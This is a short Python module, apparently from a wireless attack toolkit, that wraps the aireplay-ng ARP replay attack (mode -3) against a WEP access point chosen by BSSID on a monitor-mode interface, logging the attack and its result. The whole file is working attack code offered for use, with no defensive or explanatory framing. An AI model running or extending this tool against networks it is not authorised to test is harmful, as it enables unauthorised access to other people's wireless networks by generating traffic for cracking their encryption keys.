"""
ARP Replay for WEP: wraps aireplay-ng.
"""
import shutil
import subprocess


class ARPReplay:
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def run(self, args):
        bssid = args.bssid
        iface = self.config.mon_iface
        if not bssid:
            self.logger.error("BSSID required for ARP replay.")
            return False
        if not shutil.which("aireplay-ng"):
            self.logger.error("aireplay-ng not found. Install aircrack-ng.")
            return False
        self.logger.attack_log(f"ARP replay -> {bssid}")
        try:
            subprocess.run(["aireplay-ng", "-3", "-b", bssid, iface], timeout=args.timeout)
            self.logger.success("ARP replay completed.")
            return True
        except Exception as e:
            self.logger.error(f"ARP replay failed: {e}")
            return False
